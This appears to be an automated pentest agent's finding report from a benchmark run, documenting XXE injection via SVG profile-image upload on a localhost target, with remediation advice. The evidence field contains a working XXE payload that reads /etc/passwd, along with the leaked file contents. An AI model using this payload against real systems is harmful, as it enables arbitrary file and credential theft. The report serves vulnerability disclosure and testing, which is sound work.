{
  "title": "XXE (XML External Entity) Injection via SVG File Upload - Arbitrary File Read",
  "severity": "CRITICAL",
  "description": "The application accepts SVG file uploads in the profile image field and processes them without disabling external entity processing. An attacker can craft a malicious SVG file containing XML External Entity (XXE) declarations to read arbitrary files from the server. The XXE entities are resolved and the content is reflected back to the user in the rendered SVG, allowing complete information disclosure of sensitive files including /etc/passwd.\n\nThe vulnerability exists because the application:\n1. Accepts SVG file uploads without proper validation\n2. Processes XML/SVG content without disabling DOCTYPE and external entities\n3. Renders the processed SVG directly back to the user, exposing file contents\n4. Does not implement XXE protections at the parser level\n\nThis allows an attacker to leverage the XXE injection to read any file accessible to the application process.",
  "impact": "Complete information disclosure allowing attackers to read arbitrary files from the server. An attacker can extract:\n- System files (/etc/passwd, /etc/hosts, /etc/shadow if readable)\n- Application configuration files (containing database credentials, API keys, secrets)\n- Source code and application logic\n- Private keys and certificates\n- Environment variables and sensitive environment data\n- Any other file readable by the application process\n\nThis leads to complete system compromise, credential theft, and potential lateral movement within the infrastructure.",
  "endpoint": "http://localhost:3000/",
  "evidence": "POC executed successfully against http://localhost:3000\n\nMalicious SVG payload created:\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\">\n  <text x=\"10\" y=\"50\">&xxe;</text>\n</svg>\n```\n\nServer Response (HTTP 200 - Edit Profile Page):\nThe rendered SVG in the response contains the complete /etc/passwd file content displayed in the SVG text element:\n\n```\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nvscode:x:1000:1000::/home/vscode:/bin/bash\ndaytona:x:1001:1001::/home/daytona:/bin/sh\n[... and more system users]\n```\n\nThis confirms the XXE vulnerability is actively exploitable and allows arbitrary file read from the server.",
  "pocPath": "pocs/poc_xxe_svg_upload.sh",
  "remediation": "1. **Disable External Entity Processing**: Configure XML parsers to disable DOCTYPE, external entities, and parameter entities:\n   - For Python: Use `xml.defusedxml` library instead of standard `xml` library\n   - For Node.js: Use `libxmljs` with `noent: false` or use dedicated XXE-safe libraries\n   - For Java: Set features to disable external DTDs and entities\n\n2. **Implement SVG Sanitization**: Use dedicated SVG sanitization libraries:\n   - Use DOMPurify or svg-sanitize to strip DOCTYPE and entity declarations\n   - Configure the sanitizer to remove all potentially dangerous elements\n\n3. **File Upload Validation**:\n   - Implement strict file type validation using magic bytes (not just file extensions)\n   - Verify that uploaded SVG files are well-formed and safe before processing\n   - Reject files containing DOCTYPE declarations\n\n4. **Process in Isolated Environment**:\n   - If SVG rendering is required, perform it in a sandboxed/isolated environment\n   - Limit file system access to read-only paths that don't contain sensitive data\n\n5. **Input Sanitization**:\n   - Parse and re-serialize SVG files to remove all external references\n   - Use libraries like `bleach` (Python) or `html5lib` configured to remove dangerous elements\n\n6. **Content Security Policy**:\n   - Implement CSP headers to restrict resource loading and inline scripts",
  "references": "CWE-611: Improper Restriction of XML External Entity Reference, OWASP XXE Injection (https://owasp.org/www-community/XML_External_Entity_(XXE)_Processing), CVE-2015-9284, OWASP Top 10 - A03:2021 â€“ Injection",
  "toolCallDescription": "Document the confirmed XXE vulnerability with POC evidence showing arbitrary file read capability via SVG upload",
  "timestamp": "2025-11-07T21:55:12.305Z",
  "sessionId": "benchmark-XBEN-077-24-mhpdz86a",
  "target": "./repo"
}